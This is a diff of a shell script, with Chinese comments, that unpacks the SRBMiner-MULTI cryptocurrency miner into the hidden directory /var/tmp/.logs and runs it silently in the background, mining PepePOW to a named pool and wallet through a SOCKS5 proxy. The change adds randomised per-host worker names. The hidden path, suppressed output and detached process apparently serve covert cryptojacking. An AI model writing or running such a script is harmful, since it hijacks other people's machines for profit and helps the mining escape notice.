@@ -56,14 +56,14 @@ fi
     # 解压归档文件
     tar -xzf "$archive_path" -C /var/tmp/.logs/ &> /dev/null
 
-    # 进入解压后的目录（根据实际版本调整目录名）
+    # 进入解压后的目录
     cd /var/tmp/.logs/SRBMiner-Multi-2-6-6
 
     # 赋予文件执行权限
     chmod +x ./SRBMiner-MULTI
 
-    # 使用你的 PepePOW 配置启动 SRBMiner-MULTI，支持代理
-    ./SRBMiner-MULTI --disable-gpu --algorithm xelishashv2_pepew --cpu-threads 8 --pool stratum+tcp://eu.mining4people.com:4176 --wallet 0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf --password x --retry-time 5 --proxy socks5://192.168.1.100:1080 >/dev/null 2>&1 & disown
+    # 使用 PepePOW 配置启动 SRBMiner-MULTI，添加随机矿工名和代理
+    ./SRBMiner-MULTI --disable-gpu --algorithm xelishashv2_pepew --cpu-threads 8 --pool stratum+tcp://eu.mining4people.com:4176 --wallet 0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.miner_$(shuf -i 1000-9999 -n 1)-$(date +%s) --password x --retry-time 5 --proxy socks5://192.168.1.100:1080 >/dev/null 2>&1 & disown
 )
 
 echo "SRBMiner-MULTI 的下载和运行正在后台进行。"
